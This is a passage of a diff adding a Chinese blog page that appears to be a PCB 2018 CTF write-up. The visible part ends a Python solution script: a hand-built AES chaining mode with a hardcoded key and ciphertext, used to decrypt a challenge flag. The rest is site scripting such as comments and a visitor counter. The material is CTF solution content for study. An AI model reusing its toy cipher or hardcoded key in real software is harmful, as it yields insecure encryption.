+		<span class="hljs-comment">#self.BS=BS</span>
+	
+       
+	<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pad</span><span class="hljs-params">(<span class="hljs-keyword">self</span>,msg)</span></span>:
+		<span class="hljs-comment">#BS = AES.block_size </span>
+		<span class="hljs-comment"># aes数据分组长度为128 bit</span>
+		byte = <span class="hljs-number">16</span> - len(msg) % <span class="hljs-number">16</span>
+		<span class="hljs-keyword">return</span> msg + chr(byte) * byte
+	<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">unpad</span><span class="hljs-params">(msg)</span></span>:
+		<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-symbol">msg:</span>
+			<span class="hljs-keyword">return</span> <span class="hljs-string">''</span>
+		<span class="hljs-keyword">return</span> msg[<span class="hljs-symbol">:-ord</span>(msg[-<span class="hljs-number">1</span>])]		
+    
+	<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">xor</span><span class="hljs-params">(<span class="hljs-keyword">self</span>,a, b)</span></span>:
+    		<span class="hljs-comment">#assert len(a) == len(b)</span>
+    		<span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join([chr(ord(ai)^ord(bi)) <span class="hljs-keyword">for</span> ai, bi <span class="hljs-keyword">in</span> zip(a,b)])
+
+	<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">split_by</span><span class="hljs-params">(<span class="hljs-keyword">self</span>,data,step)</span></span>:
+        	<span class="hljs-keyword">return</span> [data[i : i+step] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, len(data), step)]
+
+	<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, plaintext)</span></span>:
+        <span class="hljs-comment"># 生成随机初始向量IV</span>
+		iv = Random.new().read(<span class="hljs-number">16</span>)
+		print <span class="hljs-string">"iv is"</span>,iv.encode(<span class="hljs-string">'hex'</span>)
+		aes = AES.new(<span class="hljs-keyword">self</span>.key,AES.MODE_CBC,iv)
+		prev_pt = iv
+		prev_ct = iv
+		ct=<span class="hljs-string">""</span>
+
+		msg=<span class="hljs-keyword">self</span>.pad(plaintext)
+		<span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> <span class="hljs-keyword">self</span>.split_by(msg, <span class="hljs-number">16</span>):
+			ct_block = <span class="hljs-keyword">self</span>.xor(block, prev_pt)
+			ct_block = aes.encrypt(ct_block)
+			ct_block = <span class="hljs-keyword">self</span>.xor(ct_block, prev_ct)
+			ct += ct_block
+			
+		<span class="hljs-keyword">return</span> b2a_hex(iv + ct)
+
+	<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, ciphertext,iv)</span></span>:
+        <span class="hljs-comment"># 生成随机初始向量IV</span>
+		print <span class="hljs-string">"iv is"</span>,iv.encode(<span class="hljs-string">'hex'</span>)
+		aes = AES.new(<span class="hljs-keyword">self</span>.key,AES.MODE_CBC,iv)
+		prev_pt = iv
+		prev_ct = iv
+		ct=<span class="hljs-string">""</span>
+
+		<span class="hljs-comment">#msg=self.pad(plaintext)</span>
+		<span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> <span class="hljs-keyword">self</span>.split_by(ciphertext, <span class="hljs-number">16</span>):
+			ct_block = <span class="hljs-keyword">self</span>.xor(block, prev_pt)
+			ct_block = aes.decrypt(ct_block)
+			ct_block = <span class="hljs-keyword">self</span>.xor(ct_block, prev_ct)
+			ct += ct_block
+			
+		<span class="hljs-keyword">return</span> b2a_hex(iv + ct)
+		
+s = <span class="hljs-string">'524160f3d098ad937e252494f827f8cf26cc549e432ff4b11ccbe2d8bfa76e5c6606aad5ba17488f11189d41bca45baa'</span> 
+iv = s[<span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">32</span>].decode(<span class="hljs-string">'hex'</span>)
+sc = s[<span class="hljs-number">32</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>].decode(<span class="hljs-string">'hex'</span>)
+print len(iv),len(sc)
+flag = <span class="hljs-string">'A'</span>*<span class="hljs-number">64</span>
+
+BS = AES.block_size <span class="hljs-comment"># aes数据分组长度为128 bit</span>
+key=<span class="hljs-string">"asdfghjkl1234567890qwertyuiopzxc"</span>
+demo = aesdemo(key)
+e = demo.encrypt(flag)
+print(<span class="hljs-string">"加密："</span>, e)
+
+aaa = demo.decrypt(sc,iv)
+print aaa
+print aaa.decode(<span class="hljs-string">'hex'</span>)</code></pre></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/writeup/">writeup</a>
+                    
+                      <a class="hover-with-bg" href="/tags/misc/">misc</a>
+                    
+                      <a class="hover-with-bg" href="/tags/PCB鹏城杯/">PCB鹏城杯</a>
+                    
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
+                    
+                      <a class="hover-with-bg" href="/tags/crypro/">crypro</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/01/17/information-collection/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Web渗透测试中一些信息收集的方法和思路</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/09/17/CSAW/">
+                        <span class="hidden-mobile">CSAW'18 CTF writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    function loadValine() {
+      addScript('https://cdn.staticfile.org/valine/1.4.14/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz",
+          app_key: "i3vUWkHRRkiiS7LuUpuIm1E5",
+          placeholder: "说些什么",
+          path: window.location.pathname,
+          avatar: "retro",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "sRx9dQVqzL65gdhuYexJtTPF",
+        });
+      });
+    }
+    waitElementVisible('vcomments', loadValine);
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://valine.js.org" rel="nofollow noopener">comments
+      powered by Valine.</a></noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    
+  <div class="statistics">
+    
+    
+    <i class="iconfont icon-users"></i>
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      <i class="iconfont icon-friends"></i>
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+    
+      
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-codeforces"></i>
+        全站共计:31.9k 字
+      </span>
+    
+  </div>
+
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer>
+  (function () {
+    // 查询存储的记录
+    function getRecord(Counter, target) {
+      return new Promise(function (resolve, reject) {
+        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({target})))
+          .then(resp => resp.json())
+          .then(({results, code, error}) => {
+            if (code === 401) {
+              throw error;
+            }
+            if (results && results.length > 0) {
+              var record = results[0];
+              resolve(record);
+            } else {
+              Counter('post', '/classes/Counter', {target, time: 0})
+                .then(resp => resp.json())
+                .then((record, error) => {
+                  if (error) {
+                    throw error;
+                  }
+                  resolve(record);
+                }).catch(error => {
+                console.error('Failed to create', error);
+                reject(error);
+              });
+            }
+          }).catch((error) => {
+          console.error('LeanCloud Counter Error:', error);
+          reject(error);
+        });
+      })
+    }
+
+    // 发起自增请求
+    function increment(Counter, incrArr) {
+      return new Promise(function (resolve, reject) {
+        Counter('post', '/batch', {
+          "requests": incrArr
+        }).then((res) => {
+          res = res.json();
+          if (res.error) {
+            throw res.error;
+          }
+          resolve(res);
+        }).catch((error) => {
+          console.error('Failed to save visitor count', error);
+          reject(error);
+        });
+      });
+    }
+
+    // 构建自增请求体
+    function buildIncrement(objectId) {
+      return {
+        "method": "PUT",
+        "path": `/1.1/classes/Counter/${ objectId }`,
+        "body": {
+          "time": {
+            '__op': 'Increment',
+            'amount': 1
+          }
+        }
+      }
+    }
+
+    // 校验是否为有效的 UV
+    function validUV() {
+      var key = 'LeanCloud_UV_Flag';
+      var flag = localStorage.getItem(key);
+      if (flag) {
+        // 距离标记小于 24 小时则不计为 UV
+        if (new Date().getTime() - parseInt(flag) <= 86400000) {
+          return false;
+        }
+      }
+      localStorage.setItem(key, new Date().getTime().toString());
+      return true;
+    }
+
+    function addCount(Counter) {
+      var enableIncr = 'true' === 'true' && window.location.hostname !== 'localhost';
+      var getterArr = [];
+      var incrArr = [];
+
+      // 请求 PV 并自增
+      var pvCtn = document.querySelector('#leancloud-site-pv-container');
+      if (pvCtn || enableIncr) {
+        var pvGetter = getRecord(Counter, 'site-pv').then((record) => {
+          incrArr.push(buildIncrement(record.objectId))
+          var ele = document.querySelector('#leancloud-site-pv');
+          if (ele) {
+            ele.innerText = record.time + 1;
+            if (pvCtn) {
+              pvCtn.style.display = 'inline';
+            }
+          }
+        });
+        getterArr.push(pvGetter);
+      }
+
+      // 请求 UV 并自增
+      var uvCtn = document.querySelector('#leancloud-site-uv-container');
+      if (uvCtn || enableIncr) {
+        var uvGetter = getRecord(Counter, 'site-uv').then((record) => {
+          var vuv = validUV();
+          vuv && incrArr.push(buildIncrement(record.objectId))
+          var ele = document.querySelector('#leancloud-site-uv');
+          if (ele) {
+            ele.innerText = record.time + (vuv ? 1 : 0);
+            if (uvCtn) {
+              uvCtn.style.display = 'inline';
+            }
+          }
+        });
+        getterArr.push(uvGetter);
+      }
+
+      // 如果是文章，请求文章的浏览数，并自增
+      if ('true' === 'true') {
+        var viewCtn = document.querySelector('#leancloud-post-views-container');
+        if (viewCtn || enableIncr) {
+          var target = decodeURI('/2018/12/03/PCBCTFwp/');
+          var viewGetter = getRecord(Counter, target).then((record) => {
+            incrArr.push(buildIncrement(record.objectId))
+            if (viewCtn) {
+              var ele = document.querySelector('#leancloud-post-views');
+              if (ele) {
+                ele.innerText = (record.time || 0) + 1;
+                viewCtn.style.display = 'inline';
+              }
+            }
+          });
+          getterArr.push(viewGetter);
+        }
+      }
+
+      // 如果启动计数自增，批量发起自增请求
+      if (enableIncr) {
+        Promise.all(getterArr).then(() => {
+          incrArr.length > 0 && increment(Counter, incrArr);
+        })
+      }
+    }
+
+    var app_id = '3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz'
+    var app_key = 'neatHwvRMvcDYnNxMBbGGFlP'
+    var server_url = 'https://3vytx5qf.lc-cn-n1-shared.com'
+
+    function fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${ api_server }/1.1${ url }`, {
+          method,
+          headers: {
+            'X-LC-Id': app_id,
+            'X-LC-Key': app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+
+      addCount(Counter);
+    }
+
+    var api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${ app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+
+    if (api_server) {
+      fetchData(api_server);
+    } else {
+      fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
+        .then(resp => resp.json())
+        .then(({api_server}) => {
+          fetchData('https://' + api_server);
+        });
+    }
+  })();
+</script>
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    function typing(id, hitokoto){
+      var typed = new Typed('#' + id, {
+        strings: [
+          '  ',
+          hitokoto + "&nbsp;",
+        ],
+        cursorChar: "_",
+        typeSpeed: 70,
+        loop: false,
+      });
+      typed.stop();
+      $(document).ready(function () {
+        $(".typed-cursor").addClass("h2");
+        typed.start();
+      });
+    };
+      
+  
+    typing("subtitle", "PCB鹏城杯CTFwriteup&复现")
+  
+  </script>
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
